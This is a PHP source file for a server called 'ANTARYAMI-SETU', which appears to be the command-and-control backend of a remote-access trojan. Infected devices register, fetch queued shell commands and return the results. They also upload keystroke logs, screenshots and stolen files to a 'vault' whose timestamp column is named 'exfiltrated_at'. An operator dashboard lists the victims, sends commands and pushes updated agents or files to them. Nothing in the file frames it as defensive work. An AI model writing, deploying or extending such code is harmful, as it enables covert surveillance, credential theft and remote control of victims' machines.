<?php
/**
 * ANTARYAMI-SETU API (MySQL Version)
 * Please make sure your database.php file creates a PDO connection named $pdo.
 * Example of database.php:
 * <?php
 * $host = 'localhost';
 * $db   = 'u123456789_setudb';
 * $user = 'u123456789_user';
 * $pass = 'YourSecretPassword';
 * $pdo = new PDO("mysql:host=$host;dbname=$db;charset=utf8mb4", $user, $pass);
 * $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 * ?>
 */

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, X-API-KEY");
header("Content-Type: text/plain"); // Return simple text for the agent

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// 0. API Key Authentication
$ADMIN_KEY = "CHANGE_THIS_ADMIN_KEY";
$AGENT_REG_KEY = "CHANGE_THIS_AGENT_KEY";
$providedKey = $_SERVER['HTTP_X_API_KEY'] ?? $_REQUEST['api_key'] ?? '';
$action = $_REQUEST['action'] ?? '';
$deviceId = $_REQUEST['device_id'] ?? '';

$adminActions = ['get_devices', 'send_cmd', 'get_results', 'get_vault', 'get_keys', 'admin_update_agent', 'admin_push_file', 'download'];
$isAdminAction = in_array($action, $adminActions);

if ($isAdminAction) {
    if ($providedKey !== $ADMIN_KEY) {
        header("HTTP/1.1 401 Unauthorized");
        die("UNAUTHORIZED_ADMIN");
    }
} else if ($action === 'telemetry') {
    if ($providedKey !== $AGENT_REG_KEY) {
        header("HTTP/1.1 401 Unauthorized");
        die("UNAUTHORIZED_REGISTRATION");
    }
}

// 1. Database Configuration (Fill in your Hostinger DB details here)
$host = 'localhost';
$db   = 'YOUR_DATABASE_NAME';        // Replace with your DB Name
$user = 'YOUR_DATABASE_USER';        // Replace with your DB Username
$pass = 'YOUR_DATABASE_PASSWORD';    // Replace with your DB Password

try {
    $pdo = new PDO("mysql:host=$host;dbname=$db;charset=utf8mb4", $user, $pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    // Fallback if they haven't filled it in yet, try to include their file
    if (file_exists("../config/database.php")) {
        include("../config/database.php");
    }
    
    if (!isset($pdo)) {
        if (isset($conn) && $conn instanceof mysqli) {
            die("ERROR: Your database.php uses 'mysqli'. Please open api_setu.php and put your Database Name, Username, and Password directly at line 18.");
        }
        die("ERROR: Database connection failed. Please open api_setu.php and enter your Database Name, Username, and Password at line 18.");
    }
}

// 2. Setup Database Tables automatically if they don't exist
try {
    $pdo->exec("CREATE TABLE IF NOT EXISTS devices (
        device_id VARCHAR(50) PRIMARY KEY,
        session_token VARCHAR(100),
        device_name VARCHAR(100),
        os_info VARCHAR(100),
        active_app VARCHAR(255),
        current_path VARCHAR(500),
        is_online TINYINT(1) DEFAULT 1,
        last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
    )");

    // Ensure session_token column exists (in case table was created by an older version)
    try {
        $pdo->exec("ALTER TABLE devices ADD COLUMN session_token VARCHAR(100) AFTER device_id");
    } catch (PDOException $e) {
        // Column already exists or table does not exist
    }

    $pdo->exec("CREATE TABLE IF NOT EXISTS commands (
        id INT AUTO_INCREMENT PRIMARY KEY,
        device_id VARCHAR(50),
        command TEXT,
        status VARCHAR(20) DEFAULT 'pending',
        output LONGTEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )");

    $pdo->exec("CREATE TABLE IF NOT EXISTS vault (
        id INT AUTO_INCREMENT PRIMARY KEY,
        device_id VARCHAR(50),
        filename VARCHAR(255),
        filepath VARCHAR(500),
        file_type VARCHAR(50),
        size INT,
        exfiltrated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )");

    $pdo->exec("CREATE TABLE IF NOT EXISTS keylogs (
        id INT AUTO_INCREMENT PRIMARY KEY,
        device_id VARCHAR(50),
        keystrokes LONGTEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )");

    $pdo->exec("CREATE TABLE IF NOT EXISTS rate_limits (
        ip_address VARCHAR(45) PRIMARY KEY,
        requests INT NOT NULL DEFAULT 1,
        reset_time INT NOT NULL
    )");
} catch (PDOException $e) {
    die("DB Setup Error: " . $e->getMessage());
}

// 2.5. Rate Limiting Check (60 requests per minute per IP)
function getClientIp() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

$action = $_REQUEST['action'] ?? '';
$adminActions = ['get_devices', 'send_cmd', 'get_results', 'get_vault', 'get_keys', 'admin_update_agent', 'admin_push_file', 'download'];
$isAdminAction = in_array($action, $adminActions);

// Only rate limit non-admin actions (e.g., agents telemetry, keylogs, file uploads)
if (!$isAdminAction) {
    $limitRequests = 300; // Allow up to 300 requests per minute for agents
    $limitWindow = 60;
    $clientIp = getClientIp();
    $currentTime = time();

    try {
        // Delete expired rate limit windows
        $delStmt = $pdo->prepare("DELETE FROM rate_limits WHERE reset_time < ?");
        $delStmt->execute([$currentTime]);

        // Check request count
        $selStmt = $pdo->prepare("SELECT requests, reset_time FROM rate_limits WHERE ip_address = ?");
        $selStmt->execute([$clientIp]);
        $rate = $selStmt->fetch(PDO::FETCH_ASSOC);

        if ($rate) {
            if ($rate['requests'] >= $limitRequests) {
                header("HTTP/1.1 429 Too Many Requests");
                header("Retry-After: " . ($rate['reset_time'] - $currentTime));
                die("RATE_LIMIT_EXCEEDED");
            }
            $updStmt = $pdo->prepare("UPDATE rate_limits SET requests = requests + 1 WHERE ip_address = ?");
            $updStmt->execute([$clientIp]);
        } else {
            $insStmt = $pdo->prepare("INSERT INTO rate_limits (ip_address, requests, reset_time) VALUES (?, 1, ?)");
            $insStmt->execute([$clientIp, $currentTime + $limitWindow]);
        }
    } catch (PDOException $e) {
        // Fail silently on rate limiting errors to avoid breaking API
    }
}

// 3. Security for uploads folder
$uploadDir = __DIR__ . '/uploads/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
    file_put_contents($uploadDir . '.htaccess', "Options -Indexes\nDeny from all\n<FilesMatch \"\.(jpg|jpeg|png|txt|zip|doc|pdf|exe)$\">\nAllow from all\n</FilesMatch>");
}

// 4. Handle incoming requests
if (empty($action)) {
    die("ANTARYAMI-SETU API - MySQL ONLINE");
}

// 4.5. Dynamic Token Authentication for Agents
if (!$isAdminAction && $action !== 'telemetry') {
    if (empty($deviceId)) {
        header("HTTP/1.1 400 Bad Request");
        die("Missing device_id");
    }
    $stmt = $pdo->prepare("SELECT session_token FROM devices WHERE device_id = ?");
    $stmt->execute([$deviceId]);
    $device = $stmt->fetch(PDO::FETCH_ASSOC);
    if (!$device || $device['session_token'] !== $providedKey) {
        header("HTTP/1.1 401 Unauthorized");
        die("UNAUTHORIZED_AGENT");
    }
}

try {
    switch ($action) {
        
        // --- AGENT ENDPOINTS ---

        case 'telemetry':
            if (empty($deviceId)) die("Missing device_id");
            $deviceName = $_POST['device_name'] ?? 'Unknown';
            $osInfo = $_POST['os_info'] ?? 'Unknown';
            $activeApp = $_POST['active_app'] ?? 'Unknown';
            $currentPath = $_POST['current_path'] ?? 'Unknown';
            $sessionToken = $_POST['session_token'] ?? '';

            $stmt = $pdo->prepare("INSERT INTO devices (device_id, session_token, device_name, os_info, active_app, current_path, is_online, last_seen) 
                                   VALUES (?, ?, ?, ?, ?, ?, 1, CURRENT_TIMESTAMP) 
                                   ON DUPLICATE KEY UPDATE 
                                   session_token=VALUES(session_token), device_name=VALUES(device_name), os_info=VALUES(os_info), 
                                   active_app=VALUES(active_app), current_path=VALUES(current_path), 
                                   is_online=1, last_seen=CURRENT_TIMESTAMP");
            $stmt->execute([$deviceId, $sessionToken, $deviceName, $osInfo, $activeApp, $currentPath]);
            echo "OK";
            break;

        case 'fetch':
            if (empty($deviceId)) die("NO_COMMAND");
            
            // Mark online
            $stmt = $pdo->prepare("UPDATE devices SET is_online = 1, last_seen = CURRENT_TIMESTAMP WHERE device_id = ?");
            $stmt->execute([$deviceId]);

            // Get pending command
            $stmt = $pdo->prepare("SELECT id, command FROM commands WHERE device_id = ? AND status = 'pending' ORDER BY id ASC LIMIT 1");
            $stmt->execute([$deviceId]);
            $cmd = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($cmd) {
                // Mark as running
                $upd = $pdo->prepare("UPDATE commands SET status = 'running' WHERE id = ?");
                $upd->execute([$cmd['id']]);
                
                echo $cmd['id'] . "|" . $cmd['command'];
            } else {
                echo "NO_COMMAND";
            }
            break;

        case 'post_output':
            if (empty($deviceId)) die("Missing device_id");
            $taskId = $_POST['task_id'] ?? '';
            $output = $_POST['output'] ?? '';
            
            if ($taskId) {
                $stmt = $pdo->prepare("UPDATE commands SET status = 'completed', output = ? WHERE id = ? AND device_id = ?");
                $stmt->execute([$output, $taskId, $deviceId]);
            }
            echo "OK";
            break;

        case 'post_keys':
            if (empty($deviceId)) die("Missing device_id");
            $keystrokes = $_POST['keystrokes'] ?? '';
            if (!empty($keystrokes)) {
                $stmt = $pdo->prepare("INSERT INTO keylogs (device_id, keystrokes) VALUES (?, ?)");
                $stmt->execute([$deviceId, $keystrokes]);
            }
            echo "OK";
            break;

        case 'upload_screenshot':
        case 'upload_file':
            if (empty($deviceId)) die("Missing device_id");
            $taskId = $_POST['task_id'] ?? '';
            
            if (isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
                $file = $_FILES['file'];
                $ext = pathinfo($file['name'], PATHINFO_EXTENSION);
                
                $safeName = preg_replace("/[^a-zA-Z0-9.\-_]/", "", $file['name']);
                $newFilename = $deviceId . "_" . time() . "_" . $safeName;
                $destination = $uploadDir . $newFilename;

                if (move_uploaded_file($file['tmp_name'], $destination)) {
                    $type = ($action === 'upload_screenshot') ? 'screenshot' : 'file';
                    
                    $stmt = $pdo->prepare("INSERT INTO vault (device_id, filename, filepath, file_type, size) VALUES (?, ?, ?, ?, ?)");
                    $stmt->execute([$deviceId, $safeName, 'uploads/' . $newFilename, $type, $file['size']]);

                    if ($taskId) {
                        $msg = "[+] File successfully uploaded to server vault: " . $safeName;
                        $upd = $pdo->prepare("UPDATE commands SET status = 'completed', output = ? WHERE id = ?");
                        $upd->execute([$msg, $taskId]);
                    }
                    echo "OK";
                } else {
                    echo "FAILED_TO_MOVE";
                }
            } else {
                echo "NO_FILE";
            }
            break;

        // --- ADMIN DASHBOARD ENDPOINTS ---

        case 'get_devices':
            // Mark devices offline if unseen for 30 seconds
            $pdo->exec("UPDATE devices SET is_online = 0 WHERE last_seen < (NOW() - INTERVAL 30 SECOND)");
            
            $stmt = $pdo->query("SELECT * FROM devices ORDER BY is_online DESC, last_seen DESC");
            $devices = $stmt->fetchAll(PDO::FETCH_ASSOC);
            
            header('Content-Type: application/json');
            echo json_encode($devices);
            break;

        case 'send_cmd':
            if (empty($deviceId)) die("Missing device_id");
            $command = $_POST['command'] ?? '';
            if (empty($command)) die("Missing command");
            
            $stmt = $pdo->prepare("INSERT INTO commands (device_id, command, status) VALUES (?, ?, 'pending')");
            $stmt->execute([$deviceId, $command]);
            echo $pdo->lastInsertId(); // Return Task ID
            break;

        case 'get_results':
            if (empty($deviceId)) die("Missing device_id");
            $lastId = $_POST['last_id'] ?? 0;
            
            $stmt = $pdo->prepare("SELECT id, command, status, output, created_at FROM commands WHERE device_id = ? AND id > ? AND status = 'completed' ORDER BY id ASC");
            $stmt->execute([$deviceId, $lastId]);
            $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
            
            header('Content-Type: application/json');
            echo json_encode($results);
            break;
            
        case 'get_vault':
            if (empty($deviceId)) die("Missing device_id");
            $stmt = $pdo->prepare("SELECT * FROM vault WHERE device_id = ? ORDER BY id DESC");
            $stmt->execute([$deviceId]);
            $files = $stmt->fetchAll(PDO::FETCH_ASSOC);
            
            header('Content-Type: application/json');
            echo json_encode($files);
            break;

        case 'get_keys':
            if (empty($deviceId)) die("Missing device_id");
            $lastId = $_POST['last_id'] ?? 0;
            
            $stmt = $pdo->prepare("SELECT id, keystrokes, created_at FROM keylogs WHERE device_id = ? AND id > ? ORDER BY id ASC");
            $stmt->execute([$deviceId, $lastId]);
            $keys = $stmt->fetchAll(PDO::FETCH_ASSOC);
            
            header('Content-Type: application/json');
            echo json_encode($keys);
            break;

        case 'admin_update_agent':
            if (empty($deviceId)) die("Missing device_id");
            if (isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
                $file = $_FILES['file'];
                $safeName = preg_replace("/[^a-zA-Z0-9.\-_]/", "", $file['name']);
                $newFilename = $deviceId . "_update_" . time() . "_" . $safeName;
                $destination = $uploadDir . $newFilename;

                if (move_uploaded_file($file['tmp_name'], $destination)) {
                    $command = "update_agent uploads/" . $newFilename;
                    $stmt = $pdo->prepare("INSERT INTO commands (device_id, command, status) VALUES (?, ?, 'pending')");
                    $stmt->execute([$deviceId, $command]);
                    echo $pdo->lastInsertId(); // Return Task ID
                } else {
                    echo "FAILED_TO_MOVE";
                }
            } else {
                echo "NO_FILE";
            }
            break;

        case 'admin_push_file':
            if (empty($deviceId)) die("Missing device_id");
            if (isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
                $file = $_FILES['file'];
                $safeName = preg_replace("/[^a-zA-Z0-9.\-_]/", "", $file['name']);
                $newFilename = $deviceId . "_push_" . time() . "_" . $safeName;
                $destination = $uploadDir . $newFilename;

                if (move_uploaded_file($file['tmp_name'], $destination)) {
                    $command = "push_file " . $safeName . "|uploads/" . $newFilename;
                    $stmt = $pdo->prepare("INSERT INTO commands (device_id, command, status) VALUES (?, ?, 'pending')");
                    $stmt->execute([$deviceId, $command]);
                    echo $pdo->lastInsertId(); // Return Task ID
                } else {
                    echo "FAILED_TO_MOVE";
                }
            } else {
                echo "NO_FILE";
            }
            break;

        case 'download':
            $filepath = $_GET['file'] ?? '';
            if (empty($filepath) || strpos($filepath, '..') !== false) die("INVALID");
            if (file_exists($filepath)) {
                $ext = strtolower(pathinfo($filepath, PATHINFO_EXTENSION));
                if ($ext === 'jpg' || $ext === 'jpeg' || $ext === 'png') header('Content-Type: image/jpeg');
                else header('Content-Type: application/octet-stream');
                readfile($filepath);
            }
            break;

        default:
            echo "UNKNOWN_ACTION";
            break;
    }
} catch (PDOException $e) {
    die("Database Error: " . $e->getMessage());
}
?>
